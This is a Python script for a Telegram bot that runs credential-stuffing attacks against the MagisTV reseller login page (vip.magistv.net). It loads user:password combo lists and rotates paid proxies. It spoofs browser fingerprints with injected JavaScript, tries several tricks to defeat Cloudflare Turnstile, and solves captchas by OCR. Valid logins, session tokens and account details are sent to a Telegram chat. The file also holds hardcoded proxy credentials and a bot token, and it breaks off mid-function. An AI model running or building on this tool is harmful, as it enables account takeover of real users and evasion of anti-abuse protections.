#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════╗
║   🎬 Flujo TV — Último intento CF (frame_locator + force)   ║
╚══════════════════════════════════════════════════════════════╝
"""

import subprocess, sys, os, time, base64, re, traceback, random, json, multiprocessing, threading
import urllib.request, urllib.parse, urllib.error
from datetime import datetime

PROXY = {
    "host": "proxy.flameproxies.com",
    "port": 8989,
    "user": "flm271a2045-package-standard",
    "pass": "3eb53887",
}
ROTATE_EVERY = 10
TG_TOKEN = "8594813440:AAFFKfWwup01Si1C-exXIN2InTABuKgRv7g"
ADMIN_IDS = []
BOT_DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bot_data")
os.makedirs(BOT_DATA_DIR, exist_ok=True)
STOP_FILE = "/tmp/flujo_bot_stop"
SCREENSHOT_DIR = os.path.join(BOT_DATA_DIR, "screenshots")
os.makedirs(SCREENSHOT_DIR, exist_ok=True)
if not os.environ.get("DISPLAY"): os.environ["DISPLAY"] = ":99"

bot_state = {"running": False, "current_chat": None, "_start_time": None, "_process": None, "debug_sent": 0, "force_no_proxy": False}

def get_proxy_conf():
    return {"server": f"http://{PROXY['host']}:{PROXY['port']}", "username": PROXY["user"], "password": PROXY["pass"]}

# ══════════════════════════════════════════════════════════════════[...]
#  TELEGRAM API
# ══════════════════════════════════════════════════════════════════[...]

def tg_api(method, params=None, files=None, timeout=30):
    url = f"https://api.telegram.org/bot{TG_TOKEN}/{method}"
    req = None
    try:
        if files:
            boundary = f"----Bound{random.randint(1000000000,9999999999)}"
            body = b""
            for k, v in (params or {}).items(): body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}\r\n".encode()
            for k, (fname, fdata) in files.items():
                body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"; filename=\"{fname}\"\r\nContent-Type: application/octet-stream\r\n\r\n".encode()
                body += fdata if isinstance(fdata, bytes) else fdata.encode(); body += b"\r\n"
            body += f"--{boundary}--\r\n".encode()
            req = urllib.request.Request(url, data=body, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
        elif params:
            data = urllib.parse.urlencode(params).encode()
            req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"})
        else: req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=timeout) as r: return json.loads(r.read())
    except urllib.error.HTTPError as e:
        try: body = e.read().decode("utf-8", errors="ignore")
        except: body = ""
        return {"ok": False, "error_code": e.code, "description": str(e), "body": body}
    except Exception as e: return {"ok": False, "error": str(e)}

def tg_send_msg(chat_id, text, parse_mode="HTML", reply_markup=None, disable_notification=False):
    params = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode, "disable_web_page_preview": True}
    if reply_markup: params["reply_markup"] = json.dumps(reply_markup)
    if disable_notification: params["disable_notification"] = True
    return tg_api("sendMessage", params)

def tg_edit_msg(chat_id, msg_id, text, parse_mode="HTML", reply_markup=None):
    params = {"chat_id": chat_id, "message_id": msg_id, "text": text, "parse_mode": parse_mode}
    if reply_markup: params["reply_markup"] = json.dumps(reply_markup)
    return tg_api("editMessageText", params)

def tg_send_doc(chat_id, filename, content, caption=None):
    files = {"document": (filename, content if isinstance(content, bytes) else content.encode("utf-8"))}
    params = {"chat_id": chat_id}
    if caption: params["caption"] = caption
    return tg_api("sendDocument", params, files=files, timeout=120)

def tg_send_photo(chat_id, photo_bytes, caption=None):
    files = {"photo": ("s.png", photo_bytes)}
    params = {"chat_id": chat_id}
    if caption: params["caption"] = caption
    return tg_api("sendPhoto", params, files=files, timeout=60)

def tg_answer_cb(qid, text=None, show_alert=False):
    params = {"callback_query_id": qid}
    if text: params["text"] = text; params["show_alert"] = show_alert
    return tg_api("answerCallbackQuery", params)

def tg_download_file(file_id):
    r = tg_api("getFile", {"file_id": file_id})
    if not r.get("ok") or not r.get("result",{}).get("file_path"): return None
    try:
        with urllib.request.urlopen(f"https://api.telegram.org/file/bot{TG_TOKEN}/{r['result']['file_path']}", timeout=60) as resp: return resp.read()
    except: return None

def esc(t): return str(t).replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")

def kb_main():
    return {"inline_keyboard": [
        [{"text": "🚀 Enviar Combo (Proxy)", "callback_data": "send_combo"}, {"text": "🌐 Sin Proxy", "callback_data": "send_local"}],
        [{"text": "🔬 Test CF", "callback_data": "test_cf"}, {"text": "⏹ Detener", "callback_data": "stop"}],
    ]}

def kb_cancel():
    return {"inline_keyboard": [[{"text": "⏹ Cancelar", "callback_data": "cancel_check"}]]}

# ══════════════════════════════════════════════════════════════════[...]
#  DEPS
# ══════════════════════════════════════════════════════════════════[...]

def run_cmd(cmd, timeout=300):
    try:
        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
        out = [l.rstrip() for l in p.stdout if l.rstrip()]; p.wait(timeout=timeout); return p.returncode == 0, "\n".join(out)
    except: return False, str(e)

def pip_install(pkg):
    for c in [[sys.executable,"-m","pip","install","-q",pkg],[sys.executable,"-m","pip","install","-q","--user",pkg],[sys.executable,"-m","pip","install","-q","--break-system-packages",pkg]]:
        if run_cmd(c)[0]: return True
    return False

def ensure_mod(imp, pip=None):
    try: __import__(imp); return True
    except ImportError: pass
    if pip_install(pip or imp):
        try: __import__(imp); return True
        except: pass
    return False

def setup_deps():
    pw = ensure_mod("playwright"); ocr = ensure_mod("ddddocr")
    if not pw: return False, False
    run_cmd([sys.executable, "-m", "playwright", "install", "--with-deps", "chromium"], timeout=300)
    return True, ocr

def parse_combo(text):
    acc = []
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"): continue
        fp = re.split(r"[:;|,\s]+", line, maxsplit=1)[0]
        if "/" in fp or fp.startswith("http") or len(fp) > 40: continue
        parts = re.split(r"[:;|,\s]+", line, maxsplit=1)
        if len(parts) == 2 and parts[0] and parts[1]:
            u, p = parts[0].strip(), parts[1].strip()
            if len(u) <= 35 and len(p) <= 60: acc.append((u, p))
    return acc

def init_ocr():
    if not ensure_mod("ddddocr"): return None
    try:
        import ddddocr
        try: return ddddocr.DdddOcr(show_ad=False)
        except TypeError: return ddddocr.DdddOcr()
    except: return None

def ocr_solve(eng, b64):
    if "," in b64: b64 = b64.split(",", 1)[1]
    return re.sub(r"[^a-zA-Z0-9]", "", eng.classification(base64.b64decode(b64)))

def get_captcha_img(page):
    try:
        for im in page.locator('img[src^="data:image/png;base64,"]').all():
            s = im.get_attribute("src") or ""
            if len(s) > 500: return s
    except: pass
    return None

# ══════════════════════════════════════════════════════════════════[...]
#  STEALTH JS — ANDROID COMPLETO
# ══════════════════════════════════════════════════════════════════[...]

STEALTH_JS = """
Object.defineProperty(navigator,'webdriver',{get:()=>undefined});
delete navigator.__proto__.webdriver;
Object.defineProperty(navigator,'platform',{get:()=>'Linux armv81'});
Object.defineProperty(navigator,'userAgentData',{get:()=>undefined});
Object.defineProperty(navigator,'vendor',{get:()=>'Google Inc.'});
Object.defineProperty(navigator,'maxTouchPoints',{get:()=>5});
Object.defineProperty(navigator,'hardwareConcurrency',{get:()=>8});
Object.defineProperty(navigator,'deviceMemory',{get:()=>4});
Object.defineProperty(navigator,'languages',{get:()=>['es-ES','es','en-US','en']});
Object.defineProperty(navigator,'language',{get:()=>'es-ES'});
window.chrome={runtime:{},loadTimes:function(){},csi:function(){},app:{}};
Object.defineProperty(navigator,'plugins',{get:()=>{const p=[{name:'Chrome PDF Plugin',filename:'internal-pdf-viewer',description:'Portable Document Format',length:1},{name:'Chrome PDF Viewer',filename:'internal-pdf-viewer',description:'Portable Document Format',length:1}];return p;}});
Object.defineProperty(navigator,'mimeTypes',{get:()=>{const m=[{type:'application/pdf',suffixes:'pdf',description:'Portable Document Format'},{type:'application/x-nacl',suffixes:'',description:'Native Client Executable'},{type:'application/x-pnacl',suffixes:'pnacl',description:'Portable Native Client Executable'}];return m;}});
const oq=window.navigator.permissions.query;window.navigator.permissions.query=(p)=>p.name==='notifications'?Promise.resolve({state:Notification.permission}):oq(p);
const gp=WebGLRenderingContext.prototype.getParameter;WebGLRenderingContext.prototype.getParameter=function(p){if(p===37445)return'Qualcomm';if(p===37446)return'Adreno (TM) 640';if(p===7936)return'WebGL';return gp.apply(this,[p]);};
Object.defineProperty(navigator,'connection',{get:()=>({effectiveType:'4g',rtt:50,downlink:10,saveData:false,type:'cellular',ontypechange:null,onchange:null,addEventListener:function(){},removeEventListener:function(){}})});
Object.defineProperty(screen,'width',{get:()=>412});Object.defineProperty(screen,'height',{get:()=>915});Object.defineProperty(screen,'availWidth',{get:()=>412});Object.defineProperty(screen,'availHeight',{get:()=>915});
Object.defineProperty(window,'devicePixelRatio',{get:()=>2.625});Object.defineProperty(window,'innerWidth',{get:()=>412});Object.defineProperty(window,'innerHeight',{get:()=>872});
window._mx=200;window._my=400;document.addEventListener('mousemove',e=>{window._mx=e.clientX;window._my=e.clientY});document.addEventListener('touchmove',e=>{if(e.touches[0]){window._mx=e.touches[0].clientX;window._my=e.touches[0].clientY}});
try{const ed=Object.getOwnPropertyDescriptor(HTMLIFrameElement.prototype,'contentWindow');Object.defineProperty(HTMLIFrameElement.prototype,'contentWindow',{get:function(){try{return ed.get.call(this);}catch(e){return undefined;}}});}catch(e){}
Object.defineProperty(Notification,'permission',{get:()=>'default'});
"""

# ══════════════════════════════════════════════════════════════════[...]
#  CLOUDFLARE — MÉTODOS MÚLTIPLES
# ══════════════════════════════════════════════════════════════════[...]

def _has_login(page):
    try:
        pw = page.locator("input[type='password']").first
        if pw.is_visible(timeout=500): return True
    except: pass
    try:
        for inp in page.locator("input[type='text']").all():
            if inp.is_visible(timeout=200):
                box = inp.bounding_box()
                if box and box["y"] > 150: return True
    except: pass
    return False

def solve_turnstile(page, max_a=12):
    """Intenta TODOS los métodos posibles para resolver Turnstile"""
    for att in range(1, max_a + 1):
        print(f"  [🛡️] Turnstile intento {att}/{max_a}")

        # ── MÉTODO 1: frame_locator (recomendado por Playwright) ──
        try:
            cf_loc = page.frame_locator('iframe[src*="challenges.cloudflare.com"]')
            for sel in ["input[type='checkbox']", "label", "#challenge-stage", "body"]:
                try:
                    el = cf_loc.locator(sel).first
                    if el.is_visible(timeout=800):
                        el.click(force=True, timeout=2000)
                        page.wait_for_timeout(6000)
                        if _has_login(page):
                            print("  [✅] Turnstile OK (frame_locator)")
                            return True
                except: continue
        except: pass

        # ── MÉTODO 2: frame.locator directamente ──
        try:
            for frame in page.frames:
                if "challenges.cloudflare.com" in (frame.url or ""):
                    for sel in ["input[type='checkbox']", "label", ".mark", ".cb-lb", "body"]:
                        try:
                            el = frame.locator(sel).first
                            if el.is_visible(timeout=500):
                                el.click(force=True, timeout=2000)
                                page.wait_for_timeout(6000)
                                if _has_login(page):
                                    print("  [✅] Turnstile OK (frame.locator)")
                                    return True
                        except: continue
        except: pass

        # ── MÉTODO 3: Coordenadas del iframe + tap ──
        try:
            for ifr in page.locator("iframe").all():
                src = ifr.get_attribute("src") or ""
                if "challenges.cloudflare.com" in src:
                    box = ifr.bounding_box()
                    if box and box["width"] > 0:
                        # Scroll al iframe
                        page.evaluate(f"window.scrollTo(0, {max(0, box['y']-100)})")
                        page.wait_for_timeout(300)
                        # Tap en el checkbox (aprox x=28, y=mitad)
                        tx = box["x"] + 28
                        ty = box["y"] + box["height"] / 2
                        page.touch.move(tx + random.randint(-5, 5), ty + random.randint(-5, 5))
                        time.sleep(random.uniform(0.3, 0.8))
                        page.tap(tx, ty)
                        page.wait_for_timeout(6000)
                        if _has_login(page):
                            print("  [✅] Turnstile OK (tap coords)")
                            return True
        except: pass

        # ── MÉTODO 4: Clic con mouse en coordenadas ──
        try:
            for ifr in page.locator("iframe").all():
                src = ifr.get_attribute("src") or ""
                if "challenges.cloudflare.com" in src:
                    box = ifr.bounding_box()
                    if box and box["width"] > 0:
                        mx = box["x"] + 28
                        my = box["y"] + box["height"] / 2
                        page.mouse.move(mx + random.randint(30, 80), my + random.randint(-30, 30))
                        time.sleep(random.uniform(0.3, 0.6))
                        page.mouse.click(mx, my)
                        page.wait_for_timeout(6000)
                        if _has_login(page):
                            print("  [✅] Turnstile OK (mouse click)")
                            return True
        except: pass

        # ── MÉTODO 5: DispatchEvent click en el frame ──
        try:
            for frame in page.frames:
                if "challenges.cloudflare.com" in (frame.url or ""):
                    try:
                        frame.evaluate("""() => {
                            const cb = document.querySelector('input[type="checkbox"]');
                            if(cb){ cb.click(); cb.dispatchEvent(new MouseEvent('click',{bubbles:true,cancelable:true})); }
                            const lb = document.querySelector('label');
                            if(lb){ lb.click(); lb.dispatchEvent(new MouseEvent('click',{bubbles:true,cancelable:true})); }
                        }""")
                        page.wait_for_timeout(6000)
                        if _has_login(page):
                            print("  [✅] Turnstile OK (dispatchEvent)")
                            return True
                    except: pass
        except: pass

        page.wait_for_timeout(2000)

    return False

def handle_cf(page, chat_id=None):
    # Esperar a que cargue
    for _ in range(30):
        page.wait_for_timeout(1000)
        if _has_login(page): return True
        # Verificar si Turnstile apareció
        try:
            for f in page.locator("iframe").all():
                if "challenges.cloudflare.com" in (f.get_attribute("src") or ""):
                    # Turnstile detectado, intentar resolver
                    if solve_turnstile(page):
                        return True
                    # Si no resolvió, seguir esperando
                    break
        except: pass
    # Última espera
    for _ in range(10):
        page.wait_for_timeout(1000)
        if _has_login(page): return True
    return False

# ══════════════════════════════════════════════════════════════════[...]
#  HELPERS
# ══════════════════════════════════════════════════════════════════[...]

def clear_auth(ctx):
    try:
        c = ctx.cookies(); ctx.clear_cookies()
        ctx.add_cookies([x for x in c if x.get("name") != "msgistv-token"])
    except: pass

def get_page_errors(page):
    msgs = []
    for sel in ['.ant-message-error','.ant-message-notice-content','.ant-form-item-explain-error','.ant-alert-error','[role="alert"]','[class*="error-text"]']:
        try:
            for el in page.locator(sel).all():
                if el.is_visible(timeout=200):
                    t = (el.text_content() or "").strip()
                    if t and 1 < len(t) < 300 and t not in msgs: msgs.append(t)
        except: continue
    return msgs

def translate_err(code, msg):
    m = (msg or "").lower()
    if not m: return f"Error {code}" if code else "Error"
    if "restrin" in m: return "🚫 IP restringida"
    if any(k in m for k in ["incorrect","password","wrong","login fail"]): return "❌ Credenciales incorrectas"
    if any(k in m for k in ["not found","no existe"]): return "❌ No existe"
    if any(k in m for k in ["locked","bloquead","disabled"]): return "🔒 Bloqueada"
    if any(k in m for k in ["captcha","código","codigo"]): return "🔄 Captcha error"
    return f"⚠️ {msg[:45]}"

def is_ip_restricted(msg): return any(k in (msg or "").lower() for k in ["restrin", "restricted"])

def check_ip_fast(ctx):
    try:
        p = ctx.new_page(); p.goto("https://api.ipify.org?format=text", timeout=10000, wait_until="domcontentloaded")
        ip = (p.inner_text("body") or "").strip(); p.close()
        return ip if ip and re.match(r'^[\d.:a-fA-F]+$', ip) else "?"
    except:
        try: p.close()
        except: pass
        return "?"

def send_screenshot(page, chat_id, label):
    if bot_state.get("debug_sent", 0) >= 5: return
    try:
        path = os.path.join(SCREENSHOT_DIR, f"{label}_{int(time.time())}.png")
        page.screenshot(path=path)
        with open(path, "rb") as f: img = f.read()
        tg_send_photo(chat_id, img, f"🐛 {label}\n📄 {esc(page.title() or '?')}\n🔗 {esc(page.url)}")
        bot_state["debug_sent"] = bot_state.get("debug_sent", 0) + 1
        os.remove(path)
    except: pass

def update_progress(chat_id, msg_id, acc, res, st):
    try:
        if not msg_id: return
        el = time.time() - st["start_time"] if st["start_time"] else 0
        sp = st["processed"] / el if el > 0 else 0
        rem = st["total"] - st["processed"]
        eta = rem / sp if sp > 0 else 0
        es = f"{int(eta//60)}m{int(eta%60)}s" if eta > 0 else "—"
        pct = (st["processed"] / st["total"] * 100) if st["total"] > 0 else 0
        bl = int(15 * pct / 100)
        bar = "█" * bl + "░" * (15 - bl)
        tg_edit_msg(chat_id, msg_id,
            f"🎬 <b>Flujo TV</b>\n[{bar}] {pct:.0f}%\n"
            f"📊 {st['processed']}/{st['total']} │ 💰<b>{st['hits']}</b> │ ❌{st['fails']}\n"
            f"⚡ {sp:.1f}/s │ ⏱ {es}\n━━━━━━━━━━━━━━━━\n<code>{esc(acc)}</code>\n  {res}\n🌐 {st.get('ip','?')}",
            reply_markup=kb_cancel())
    except: pass

# ══════════════════════════════════════════════════════════════════[...]
#  DIAGNÓSTICO
# ══════════════════════════════════════════════════════════════════[...]

def test_cf(chat_id):
    from playwright.sync_api import sync_playwright
    tg_send_msg(chat_id, "🔬 Diagnosticando... (60s)")
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=False, args=["--no-sandbox","--disable-blink-features=AutomationControlled"])
            ctx = browser.new_context(
                user_agent="Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
                viewport={"width":412,"height":915}, is_mobile=True, has_touch=True,
                screen={"width":412,"height":915}, device_scale_factor=2.625,
                proxy=get_proxy_conf(),
                extra_http_headers={"Accept-Language":"es-ES,es;q=0.9","Sec-CH-UA-Platform":'"Android"',"Sec-CH-UA-Mobile":"?1","Sec-CH-UA":'"Not A(Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"'}
            )
            ctx.add_init_script(STEALTH_JS)
            page = ctx.new_page()

            error = "Ninguno"
            try: page.goto("https://vip.magistv.net/mobile/login", wait_until="domcontentloaded", timeout=45000)
            except Exception as e: error = str(e)[:150]

            # Esperar hasta 60 segundos
            ok = False
            for sec in range(60):
                page.wait_for_timeout(1000)
                if _has_login(page): ok = True; break
                # Cada 10s mandar screenshot intermedio
                if sec in [9, 19, 29, 39, 49]:
                    try:
                        path = os.path.join(SCREENSHOT_DIR, f"diag_{sec}s.png")
                        page.screenshot(path=path)
                        with open(path, "rb") as f: img = f.read()
                        tg_send_photo(chat_id, img, f"⏱ {sec+1}s — {esc(page.title() or '?')}", disable_notification=True)
                        os.remove(path)
                    except: pass

            path = os.path.join(SCREENSHOT_DIR, "diag_final.png")
            page.screenshot(path=path)
            with open(path, "rb") as f: img = f.read()
            os.remove(path)

            title = page.title() or "?"
            if ok: r = "🟢 <b>CF RESUELTO — LOGIN VISIBLE</b>\nEl bot debería funcionar."
            elif "incompatible" in title.lower(): r = "🔴 <b>INCOMPATIBLE — Proxy no soporta Turnstile</b>\nNecesitas cambiar de proxy."
            elif "un momento" in title.lower(): r = "🔴 <b>TURNSTILE NO PASA</b>\nEl click no llega o el proxy bloquea Turnstile.\n<b>Solución: cambiar de proxy a uno que soporte Cloudflare Turnstile</b>"
            else: r = f"🟡 Resultado incierto. Title: {title}"

            tg_send_photo(chat_id, img, f"{r}\n\n⏱ {min(60, sec+1)}s\n📄 {esc(title)}\n❌ {esc(error)}")
            browser.close()
    except Exception as e:
        tg_send_msg(chat_id, f"❌ <code>{esc(str(e)[:200])}</code>")

# ══════════════════════════════════════════════════════════════════[...]
#  MOTOR
# ══════════════════════════════════════════════════════════════════[...]

def run_checker(accounts, chat_id, msg_id, use_proxy):
    from playwright.sync_api import sync_playwright
    hits, hits_lines, errors = [], [], {}
    processed = fails = 0
    start_time = time.time()
    bot_state["debug_sent"] = 0
    stats = {"total": len(accounts), "hits": 0, "fails": 0, "processed": 0, "start_time": start_time, "ip": "VPS" if not use_proxy else "?"}
    ocr_engine = init_ocr()
    UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36"

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False, args=["--disable-blink-features=AutomationControlled","--no-sandbox","--disable-dev-shm-usage","--disable-infobars","--window-size=412,915","--no-first-run"])
        idx = batch_num = 0
        cf_fails = 0

        while idx < len(accounts):
            if os.path.exists(STOP_FILE):
                try: tg_edit_msg(chat_id, msg_id, "⏹ <b>Detenido</b>", reply_markup=kb_main())
                except: pass
                try: browser.close()
                except: pass
                return hits, hits_lines

            batch_num += 1
            batch_end = min(idx + ROTATE_EVERY, len(accounts))
            ctx_kw = {
                "user_agent": UA, "viewport": {"width":412,"height":915}, "is_mobile": True, "has_touch": True,
                "screen": {"width":412,"height":915}, "device_scale_factor": 2.625,
                "extra_http_headers": {"Accept-Language":"es-ES,es;q=0.9","Sec-CH-UA-Platform":'"Android"',"Sec-CH-UA-Mobile":"?1","Sec-CH-UA":'"Not A(Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"'}
            }
            if use_proxy: ctx_kw["proxy"] = get_proxy_conf()

            context = page = None
            try:
                context = browser.new_context(**ctx_kw)
                context.add_init_script(STEALTH_JS)
                page = context.new_page()
            except Exception as e:
                fails += (batch_end-idx); processed += (batch_end-idx); stats["fails"]=fails; stats["processed"]=processed
                update_progress(chat_id, msg_id, f"B{batch_num}", f"Ctx:{str(e)[:25]}", stats); idx=batch_end; continue

            nav_ok = False; nav_err = ""
            for _ in range(3):
                try: page.goto("https://vip.magistv.net/mobile/login", wait_until="domcontentloaded", timeout=45000); nav_ok=True; break
                except Exception as e: nav_err=str(e)[:80]; time.sleep(3)

            if not nav_ok:
                fails += (batch_end-idx); processed += (batch_end-idx); stats["fails"]=fails; stats["processed"]=processed
                update_progress(chat_id, msg_id, f"B{batch_num}", "Nav fail", stats); cf_fails+=1
                send_screenshot(page, chat_id, f"nav_b{batch_num}")
                if cf_fails >= 2: time.sleep(15); cf_fails=0
                idx=batch_end
                try: context.close()
                except: pass
                continue

            if not handle_cf(page, chat_id):
                fails += (batch_end-idx); processed += (batch_end-idx); stats["fails"]=fails; stats["processed"]=processed
                update_progress(chat_id, msg_id, f"B{batch_num}", "CF fail", stats); cf_fails+=1
                send_screenshot(page, chat_id, f"cf_b{batch_num}")
                if cf_fails >= 2: time.sleep(20); cf_fails=0
                idx=batch_end
                try: context.close()
                except: pass
                continue

            cf_fails = 0
            if use_proxy: ip=check_ip_fast(context); stats["ip"]=ip; print(f"  [🔄] B{batch_num} IP:{ip}")
            else: stats["ip"]="VPS"

            state = {}
            NON_LOGIN = ["/codigo","/info","/dashboard","/home/img","/img"]

            def make_on_resp(st):
                def on_resp(resp):
                    url=resp.url
                    try:
                        if "/api/v1/magis/codigo" in url and resp.status==200:
                            d=resp.json()
                            if d.get("code")==200: st["cap_b64"]=d["data"]["data"]
                    except: pass
                    try:
                        if "/api/v1/magis/info" in url and resp.status==200:
                            d=resp.json()
                            if d.get("code")==200 and d.get("data"): st["info"]=d["data"]
                            elif "restrin" in d.get("msg","").lower(): st["login_code"]=d.get("code",500); st["login_msg"]=d.get("msg",""); st["api_hit"]=True
                    except: pass
                    try:
                        if "/api/v1/magis/dashboard" in url and resp.status==200:
                            d=resp.json()
                            if d.get("code")==200 and d.get("data"): st["dashboard"]=d["data"]
                    except: pass
                    if "/api/" in url:
                        lk=["/login","/signin","/auth","/authenticate"]
                        il=any(l in url.lower() for l in lk)
                        ac=st.get("clicked_at",0)>0 and (time.time()-st["clicked_at"])<15
                        if (il or ac) and not st.get("api_hit") and not any(n in url for n in NON_LOGIN):
                            try:
                                d=resp.json(); st["api_hit"]=True; st["login_code"]=d.get("code",resp.status); st["login_msg"]=d.get("msg","")
                                if d.get("code")==200:
                                    st["login_ok"]=True
                                    tok=d.get("data",{}).get("token") if isinstance(d.get("data"),dict) else None
                                    if tok: st["token"]=tok
                            except: st["api_hit"]=True; st["login_code"]=resp.status
                return on_resp

            page.on("response", make_on_resp(state))
            ip_rest = False

            for li in range(batch_end-idx):
                if os.path.exists(STOP_FILE): break
                user,pwd=accounts[idx]; processed+=1; stats["processed"]=processed
                state.clear(); state.update({"cap_b64":None,"info":None,"dashboard":None,"token":None,"login_ok":False,"login_msg":"","login_code":-1,"api_hit":False,"clicked_at":0})
                clear_auth(context)

                try: page.goto("https://vip.magistv.net/mobile/login",wait_until="domcontentloaded",timeout=25000)
                except:
                    try: page.goto("https://vip.magistv.net/mobile/login",wait_until="domcontentloaded",timeout=25000)
                    except: fails+=1;stats["fails"]+=1;update_progress(chat_id,msg_id,user,"Nav err",stats);idx+=1;continue

                page.wait_for_timeout(1000)
                if not _has_login(page):
                    if not handle_cf(page): fails+=1;stats["fails"]+=1;update_progress(chat_id,msg_id,user,"CF fail",stats);idx+=1;continue

                try:
                    el=page.locator('input[type="text"]').first;el.wait_for(state="visible",timeout=3000);el.tap();time.sleep(0.1);el.fill(user)
                except: fails+=1;stats["fails"]+=1;update_progress(chat_id,msg_id,user,"No input",stats);idx+=1;continue

                time.sleep(0.15)
                try:
                    pw_el=page.locator('input[type="password"]').first;pw_el.wait_for(state="visible",timeout=3000);pw_el.tap();time.sleep(0.1);pw_el.fill(pwd)
                except: fails+=1;stats["fails"]+=1;update_progress(chat_id,msg_id,user,"No pass",stats);idx+=1;continue

                time.sleep(0.15)
                login_ok = False
                for ci in range(1,4):
                    if ci>1:
                        state["cap_b64"]=None
                        try:
                            img=page.locator('img[src^="data:image"]').first
                            if img.is_visible(timeout=1000):img.tap();page.wait_for_timeout(1500)
                        except:pass
                    if not state.get("cap_b64"):
                        pg=get_captcha_img(page)
                        if pg:state["cap_b64"]=pg
                        if not state.get("cap_b64"):
                            for _ in range(8):
                                if state.get("cap_b64"):break
                                page.wait_for_timeout(800)

                    cf=False
                    if ocr_engine and state.get("cap_b64"):
                        try:
                            ct=ocr_solve(ocr_engine,state["cap_b64"])
                            if ct:
                                for sel in ['input[placeholder="validateCode"]','input[placeholder*="code" i]']:
                                    try: el=page.locator(sel).first;el.tap();el.fill("");el.fill(ct);cf=True;break
                                    except:continue
                                if not cf:
                                    try:
                                        for inp in reversed(page.locator("input").all()):
                                            tp=inp.get_attribute("type") or "text"
                                            if tp in ("text","") and inp.is_visible() and not inp.input_value():inp.tap();inp.fill("");inp.fill(ct);cf=True;break
                                    except:pass
                        except:pass

                    state["clicked_at"]=time.time();state["api_hit"]=False
                    for sel in ['button[type="submit"]','button:has-text("Login")','.ant-btn-primary','button[class*="login"]']:
                        try: el=page.locator(sel).first;el.is_visible(timeout=500);el.tap();break
                        except:continue

                    success=False
                    for w in range(20):
                        if state.get("login_ok"):success=True;break
                        if "/mobile/home" in page.url:success=True;break
                        try:
                            for c in context.cookies():
                                if "msgistv-token" in c.get("name","") and c.get("value"):success=True;break
                        except:pass
                        if success:break
                        if state.get("api_hit") and state["login_code"]!=200:break
                        if w>=3 and not state.get("api_hit"):
                            pe=get_page_errors(page)
                            if pe:break
                        page.wait_for_timeout(800)

                    if success:login_ok=True;break
                    msg=(state.get("login_msg") or "").lower()
                    if any(k in msg for k in ["captcha","código","codigo","code","valida"]):
                        try:
                            for sel in ['input[placeholder="validateCode"]','input[placeholder*="code" i]']:
                                el=page.locator(sel).first;el.is_visible(timeout=400);el.fill("")
                        except:pass
                        continue
                    break

                if state.get("api_hit") and is_ip_restricted(state.get("login_msg","")):
                    fails+=1;stats["fails"]+=1;update_progress(chat_id,msg_id,user,"🚫 IP restringida",stats);idx+=1;ip_rest=True;break

                if login_ok or state.get("login_ok") or "/mobile/home" in page.url:
                    if not state.get("token"):
                        try:
                            for c in context.cookies():
                                if "msgistv-token" in c.get("name",""):state["token"]=c.get("value");break
                        except:pass
                    try:page.goto("https://vip.magistv.net/mobile/home",wait_until="domcontentloaded",timeout=12000)
                    except:pass
                    for _ in range(12):
                        if state.get("info") and state.get("dashboard"):break
                        page.wait_for_timeout(800)
                    if not state.get("info") or not state.get("dashboard"):
                        try:page.reload(wait_until="domcontentloaded",timeout=8000);page.wait_for_timeout(2500)
                        except:pass

                    info=state.get("info") or {};dash=state.get("dashboard") or {}
                    rev="✅" if info.get("is_revendedor") else "❌";sup="✅" if info.get("is_super") else "❌"
                    hits.append({"username":user,"password":pwd,"info":info,"dashboard":dash,"token":state.get("token")})
                    hits_lines.append(f"{user}:{pwd}");stats["hits"]+=1
                    detail=f"💰 <b>HIT #{len(hits)}</b>\n👤 <code>{user}:{pwd}</code>\n📝 {info.get('name','—')}\n🆔 {info.get('id','—')}\n🏪 Rev:{rev} 👑 Sup:{sup}\n📦 TV:{dash.get('tv',0)}"
                    update_progress(chat_id,msg_id,user,f"💰 HIT! Rev={rev}",stats)
                    try:tg_send_msg(chat_id,detail,disable_notification=True)
                    except:pass
                    print(f"  [💰] HIT #{len(hits)} — {user}")
                else:
                    fails+=1;stats["fails"]+=1
                    if state.get("api_hit"):reason=translate_err(state["login_code"],state["login_msg"])
                    else:
                        pe=get_page_errors(page);reason=pe[0] if pe else "Sin respuesta"
                    errors[reason]=errors.get(reason,0)+1
                    update_progress(chat_id,msg_id,user,reason,stats)

                idx+=1;time.sleep(0.3)
            try:context.close()
            except:pass
            if ip_rest:continue
        try:browser.close()
        except:pass
    return hits,hits_lines

# ══════════════════════════════════════════════════════════════════[...]
#  START CHECK
# ══════════════════════════════════════════════════════════════════[...]

waiting_combo = set()

def start_check(accounts, chat_id, use_proxy=True):
    if bot_state["running"]:tg_send_msg(chat_id,"⏳ Ocupado.",reply_markup=kb_main());return
    if os.path.exists(STOP_FILE):os.remove(STOP_FILE)
    bot_state["running"]=True;bot_state["current_chat"]=chat_id;bot_state["_start_time"]=time.time();bot_state["debug_sent"]=0
    mode="PROXY" if use_proxy else "SIN PROXY"
    tg_send_msg(chat_id,f"🚀 <b>{mode}</b> — {len(accounts)} cuentas")
    r=tg_send_msg(chat_id,"⏳ Preparando...",reply_markup=kb_cancel())
    pmid=r.get("result",{}).get("message_id") if r.get("ok") else None

    def worker(accounts,chat_id,pmid,use_proxy):
        try:
            hits,hl=run_checker(accounts,chat_id,pmid,use_proxy)
            el=time.time()-bot_state["_start_time"]
            if hl:
                ts=datetime.now().strftime("%Y%m%d_%H%M%S")
                tg_send_doc(chat_id,f"hits_{ts}.txt","\n".join(hl),caption=f"📦 {len(hl)} hits")
